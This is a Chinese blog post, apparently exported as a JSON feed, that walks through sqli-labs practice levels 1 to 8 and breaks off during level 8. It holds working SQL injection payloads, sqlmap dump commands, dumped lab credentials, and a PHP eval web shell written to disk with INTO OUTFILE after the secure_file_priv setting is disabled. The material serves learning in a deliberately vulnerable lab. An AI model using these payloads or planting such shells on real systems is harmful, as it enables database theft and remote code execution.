{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0的秘密花园 • All posts by \"sql注入靶场\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "url": "http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "title": "sqli-labs基础关卡",
            "date_published": "2020-11-16T13:29:27.000Z",
            "content_html": "<h1 id=\"less-1\"><a class=\"markdownIt-Anchor\" href=\"#less-1\">#</a> Less-1</h1>\n<p>date:2020-11-16 21:29:27</p>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h2>\n<p>根据题目提示：Please input the ID as parameter with numeric value ，注入点为 id</p>\n<h3 id=\"sqlmap\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap\">#</a> sqlmap：</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 --dbs --batch</span><br><span class=\"line\">爆表：</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security --tables --batch</span><br><span class=\"line\">爆字段:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users --columns --batch</span><br><span class=\"line\">爆字段值:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users -C id,password,username --dump --batch</span><br><span class=\"line\"></span><br><span class=\"line\">拿到数据，别的表同理：</span><br><span class=\"line\">Database: security</span><br><span class=\"line\">Table: users</span><br><span class=\"line\">[13 entries]</span><br><span class=\"line\">+----+------------+----------+</span><br><span class=\"line\">| id | password   | username |</span><br><span class=\"line\">+----+------------+----------+</span><br><span class=\"line\">| 1  | Dumb       | Dumb     |</span><br><span class=\"line\">| 2  | I-kill-you | Angelina |</span><br><span class=\"line\">| 3  | p@ssword   | Dummy    |</span><br><span class=\"line\">| 4  | crappy     | secure   |</span><br><span class=\"line\">| 5  | stupidity  | stupid   |</span><br><span class=\"line\">| 6  | genious    | superman |</span><br><span class=\"line\">| 7  | mob!le     | batman   |</span><br><span class=\"line\">| 8  | admin      | admin    |</span><br><span class=\"line\">| 9  | admin1     | admin1   |</span><br><span class=\"line\">| 10 | admin2     | admin2   |</span><br><span class=\"line\">| 11 | admin3     | admin3   |</span><br><span class=\"line\">| 12 | dumbo      | dhakkan  |</span><br><span class=\"line\">| 14 | admin4     | admin4   |</span><br><span class=\"line\">+----+------------+----------+</span><br></pre></td></tr></table></figure>\n<h3 id=\"手工注入\"><a class=\"markdownIt-Anchor\" href=\"#手工注入\">#</a> 手工注入：</h3>\n<p>先小心翼翼地试一个 id=1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1</span><br></pre></td></tr></table></figure>\n<p>哦豁，有数据回显</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>用 orderby 试一下要几个字段，但是发现随便 oderby 都是一样的回显…</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=2 order by 110</span><br></pre></td></tr></table></figure>\n<p>中间试了好多都没有给回应，加单引号报错看一下 sql 语句，先入为主以为是数字型的了，明明题目也写了… 蠢爆了！！！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27;</span><br><span class=\"line\">输出：</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>orderby 试出来是要三个字段，因为要闭合后面的单引号好麻烦就直接用 #（URL 编码 %23）注释了后面的代码，自己搞</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27; order by 3 limit 1 %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27; order by 4 limit 1 %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<p>三个字段，只输出了两个值，理所当然有一个 id 啦，所以第一个字段随便搞，后面两个字段用了输出我们要的数据，一套流程走</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库，从mysql默认的数据库information_schema里找所有的数据，使用group_concat拼接：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,database(),group_concat(schema_name) from information_schema.schemata %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">第二个字段是当前数据库security，第三个字段是输出localhost所有的数据库</span><br><span class=\"line\"></span><br><span class=\"line\">爆表：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:emails,referers,uagents,users</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br><span class=\"line\">爆字段：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br><span class=\"line\">爆字段值：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(concat_ws(&#x27;--&#x27;,id,username,password)),3 from users+%23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:1--Dumb--Dumb,2--Angelina--I-kill-you,3--Dummy--p@ssword,4--secure--crappy,5--stupid--stupidity,6--superman--genious,7--batman--mob!le,8--admin--admin,9--admin1--admin1,10--admin2--admin2,11--admin3--admin3,12--dhakkan--dumbo,14--admin4--admin4</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<ol>\n<li>虽然我觉得闭合引号很麻烦，但是我就是还是想去试一下，直接在最后闭合就可以了，也不会报语法错</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&quot; order by 3 &quot;</span><br></pre></td></tr></table></figure>\n<p>​\t\t那为什么大家闭合的时候都喜欢用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>\n<p>画面感地理解一下函数</p>\n<p>concat_ws () 是拼接一行的数据</p>\n<p>group_concat () 是拼接一列的数据</p>\n</li>\n<li>\n<p>因为 sql 学的就很菜，有些语法函数什么的还要百度，mysql 里 information_schema 里的，很多表名和字段名经常搞混，手工注入的时候还要去看具体的表名和字段名，超级浪费时间的，可是记一下吧很久不写又忘记了，而且数据库那么多，默认的表都不一样，还是多写题 8</p>\n</li>\n<li>\n<p>跑 sqlmap 的时候，会给出相应的 payload，有些写得真的超级复杂，说是为了绕过把，可是有个 select 就感觉绕不过去呀，等有一天我不再是一个连脚本都不会用的菜鸡了，有机会的话，想去研读一下源码</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-2\"><a class=\"markdownIt-Anchor\" href=\"#less-2\">#</a> Less-2</h1>\n<p>data: 2020-11-17 10:32:43</p>\n<h2 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程</h2>\n<p>和 less-1 相比就是少闭合了两个引号罢了</p>\n<h3 id=\"sqlmap-2\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-2\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-2\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-2\">#</a> 手工注入</h3>\n<p>判断 id 是注入点且需要三个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:http://www.sqli-labs.com/Less-2?id=1 order by 4输出：Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;payload:http://www.sqli-labs.com/Less-2?id=1 order by 3输出：Your Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>和 less-1 一样一套流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata爆当前数据库的表：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema爆字段：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;爆字段值：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结</h2>\n<p>想当年我还是个不管写什么题目都要看通关手册的人，鼓掌！！！</p>\n<hr>\n<h1 id=\"less-3\"><a class=\"markdownIt-Anchor\" href=\"#less-3\">#</a> Less-3</h1>\n<p>date:2020-11-17 11:00:04</p>\n<h2 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程</h2>\n<h3 id=\"sqlmap-3\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-3\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-3\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-3\">#</a> 手工注入</h3>\n<p>加单引号报错，看后面具体要闭合啥</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-3?id=1asdf&#x27;kkkk</span><br></pre></td></tr></table></figure>\n<p>输出，发现后面有括号啥的闭合一下，并且 id 也是字符型的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;kkkk&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>根据 order by 判断需要的字段数是 3 个</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 4 --+http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 3 --+</span><br></pre></td></tr></table></figure>\n<p>脱脱脱：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆当前数据库的表：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+爆字段：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+爆字段值：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结</h2>\n<p>?id=1&quot; 竟然正常返回信息了！！！</p>\n<p>因为 id=xx (‘1&quot;’) 了啊，根本没闭合啊，有点弱智哦</p>\n<hr>\n<h1 id=\"less-4\"><a class=\"markdownIt-Anchor\" href=\"#less-4\">#</a> Less-4</h1>\n<p>date:2020-11-17 11:25:45</p>\n<h2 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程</h2>\n<h3 id=\"sqlmap-4\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-4\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-4\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-4\">#</a> 手工注入</h3>\n<p>发现双引号报错，所以可以直接在后面加 &quot;) %23+ 进行闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-4?id=1&quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>根据 order by 确定是三个字段后，union select 拿数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆当前数据库的表：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+爆字段：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+爆字段值：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结</h2>\n<p>没啥好说的</p>\n<hr>\n<h1 id=\"less-5\"><a class=\"markdownIt-Anchor\" href=\"#less-5\">#</a> Less-5</h1>\n<p>date:2020-11-17 11:48:40</p>\n<h2 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程</h2>\n<h3 id=\"sqlmap-5\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-5\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-5\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-5\">#</a> 手工注入</h3>\n<p>单引号报错，payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>‘‘1’’ LIMIT 0,1’第一个单引号真的巨坑，总是眼糊看错成 SQL 语句里面的</p>\n<p>闭合单引号，用 order by 确定是提取了三个字段，但是页面上并没有输出字段的值，目测是后台进行了判断</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27; order by 3 +%23+输出：You are in...........</span><br></pre></td></tr></table></figure>\n<p>前端没有发现啥有用的东西，撸了一下 floor 报错，开干</p>\n<p>爆库 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>然后像以前一样的流程，在 concat 里面找自己要的数据就好了</p>\n<h2 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结</h2>\n<ol>\n<li>\n<p><a href=\"https://www.cnblogs.com/litlife/p/8472323.html\">select count (*) from test group by floor (rand (0)*2) 报错原理 666</a></p>\n<p>概括一下:</p>\n<p>floor (rand (0)*2) 是随机 0、1，但是是伪随机 011011…</p>\n<p>count (*) 与 group by 共同工作时会建立一张虚拟表，两个字段 (关键字和数量)</p>\n<p>floor 表达式第一次运算的值为 0，在表中没有找到 key 为 0 的数据，故插入，在插入的过程中需要再取一次 group by 后面的值（即再进行一次 floor 运算，结果为 1），取到了 1，将之插入，并将 count (*) 置 1。</p>\n<p>也就是说一次插入要调用两次 floor，所以在后面碰见 01 时，0 没有，插入 1，但是 1 已经存在，报错</p>\n</li>\n<li>\n<p>payload 是 sqlmap 复制后修改的，自己手动输入的总是说有语法错，我对着看了好多遍感觉没有什么问题啊，无理取闹，后来看报错应该是 and 后面的 select from 的表要别名 (Every derived table must have its own alias)，select from 外面还要加一个括号</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-6\"><a class=\"markdownIt-Anchor\" href=\"#less-6\">#</a> Less-6</h1>\n<p>data: 2020-11-17 15:50:40</p>\n<h2 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程</h2>\n<h3 id=\"sqlmap-6\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-6\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-6\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-6\">#</a> 手工注入</h3>\n<p>输入了 less-5 里面的 payload，发现不报错了！</p>\n<p>机智的我去看 sqlmap 发现就是变成了闭合双引号罢了唉，人傻了</p>\n<p>爆当前库 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-6?id=1&quot; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&quot;1</span><br></pre></td></tr></table></figure>\n<p>CONCAT (payload,floor (rand (0)*2)) 作为 group by 的 key</p>\n<h2 id=\"总结-6\"><a class=\"markdownIt-Anchor\" href=\"#总结-6\">#</a> 总结</h2>\n<p>没啥好总结的，还以为又有新东西可以看了</p>\n<hr>\n<h1 id=\"less-7\"><a class=\"markdownIt-Anchor\" href=\"#less-7\">#</a> Less-7</h1>\n<p>date:2020-11-17 16:09:39</p>\n<h2 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程</h2>\n<h3 id=\"sqlmap-7\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-7\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<p>sqlmap 用的时间盲注，它自己跑着跑着连接就断了，笑死</p>\n<h3 id=\"手工注入-7\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-7\">#</a> 手工注入</h3>\n<p>试了一些，目测后台做了判断</p>\n<p>sql 报错统一输出：</p>\n<p>You have an error in your SQL syntax</p>\n<p>正常输出：You are in… Use outfile…</p>\n<p>盲注的话，二分法判断字符的 ascii 码值，sqlmap 都说它扛不住了</p>\n<p>看见正常输出那里有个 use outfile…，感觉是个提示，新东西就要百度看看，好叭这里直接看通关秘籍了，竟然直接写入文件 getshell 了…</p>\n<p>太帅了，动手撸一遍</p>\n<p>要上传一句话连接的话，需要知道路径，去有回显的题拿路径啦</p>\n<p>basedir 参数指定了安装 MySQL 的安装路径</p>\n<p>datadir 参数指定了 MySQL 的数据库文件放在什么路径下</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/?id=-1&#x27; union select 1,@@datadir,@@basedir MYSQL %23+</span><br></pre></td></tr></table></figure>\n<p>输出，并没有 phpstudy 的路径，因为我根本没用 phpstudy 的数据库…：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:C:\\ProgramData\\MySQL\\MySQL Server 5.5\\Data\\Your Password:C:/Program Files (x86)/MySQL/MySQL Server 5.5/</span><br></pre></td></tr></table></figure>\n<p>尝试在获取到的路径下存入 php 一句话：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7/?id=1 union select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/ProgramData/MySQL/MySQL Server 5.5/Data/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>但是一直报错，愤怒地直接去 mysql 运行的时候，发现报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[SQL] select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/haha.php&#x27;[Err] 1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>\n<p>去查了一下报错原因：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将桌面文件存储到mysql时报错：The MySQL server is running with the --secure-file-pri option so it cannot execute this.</span><br><span class=\"line\">报错原因：mysql文件的导入和导出路径有默认的设置，即 secure-file-priv,当传入的csv文件路径与默认的路径冲突时就会报错。</span><br><span class=\"line\">secure-file-priv的值有三种情况：secure_file_prive=null ––限制mysqld 不允许导入导出</span><br><span class=\"line\">secure_file_priv=/path/ – --限制mysqld的导入导出只能发生在默认的/path/目录下</span><br><span class=\"line\">secure_file_priv=’’ – --不对mysqld 的导入 导出做限制</span><br></pre></td></tr></table></figure>\n<p>通过命令  <code>select @@secure_file_priv</code>  查询，发现 secure_file_priv 的值为 null，也就是说不允许导入导出</p>\n<p>于是到 mysql 的安装目录下修改 my.ini 配置文件，在 mysqld 节点下加入 secure_file_priv=’’，对导入导出不进行限制</p>\n<p>在尝试 payload 时，</p>\n<p>?id=1 order by 111111 %23 + 不报错</p>\n<p>?id=1’ order by 111111 %23 + 报错</p>\n<p>?id=1&quot; order by 111111 %23 + 不报错</p>\n<p>说明有一个单引号要闭合</p>\n<p>?id=1’ order by 1 %23 + 报错</p>\n<p>?id=1’)) order by 3 %23 + 不报错</p>\n<p>?id=1’)) order by 4 %23 + 报错</p>\n<p>闭合成功，且需要三个字段</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select &#x27;&lt;?php @eval($_POST[&quot;haha&quot;]); ?&gt;&#x27;,2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>虽然输出还是报错，但是文件已经上传到 D 盘了（因为这个 sql 语句我已经在数据库试了很多遍了…）</p>\n<p>但是因为我的 mysql 不是 PHPstudy 的，所以没有搞到 phpstudy 的路径，没有上传到 phpstudy 目录下，也连接不上解析不了？</p>\n<p>机智的我决定手动复制到 www 下</p>\n<p>上蚁剑连接成功</p>\n<p>另外要看数据库数据的话可以通过改上面的 p 输出文件，然后上蚁剑查看输出的文件内容，其余的爆数据库和之前的题目都一样的流程，例如爆当前数据库名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select database(),2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>因为用命令行登录数据库需要密码</p>\n<h3 id=\"总结-7\"><a class=\"markdownIt-Anchor\" href=\"#总结-7\">#</a> 总结</h3>\n<ol>\n<li>\n<p>MySQL 的 @与 @@区别</p>\n<p>@x 是 用户自定义的变量 (User variables are written as @var_name)</p>\n<p>@@x 是 global 或 session 变量 (@@global @@session)</p>\n</li>\n<li>\n<p>菜鸡的悲哀就是做个题还要靠作弊（菜菜子不要难过！你会变强的！）</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-8\"><a class=\"markdownIt-Anchor\" href=\"#less-8\">#</a> Less-8</h1>\n<p>date:2020-11-21 13:58:47</p>\n<h2 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程</h2>\n<h3 id=\"sqlmap-8\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-8\">#</a> sqlmap</h3>\n<p>同 less-1，看见 sqlmap 的 payload，它也是盲注咯</p>\n<h3 id=\"手工注入-8\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-8\">#</a> 手工注入</h3>\n<p>单引号闭合后分别 order by 3 和 4，发现一个正常输出一个不输出，说明单引号闭合成功，order by 执行成功，且需要三个字段，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-8?id=1&#x27; order by 3 %23+http://www.sqli-labs.com/Less-8?id=1&#x27; order by 4 %23+</span><br></pre></td></tr></table></figure>\n<p>没有回显数据，只能盲注</p>\n<p>尝试第七关的 outfile 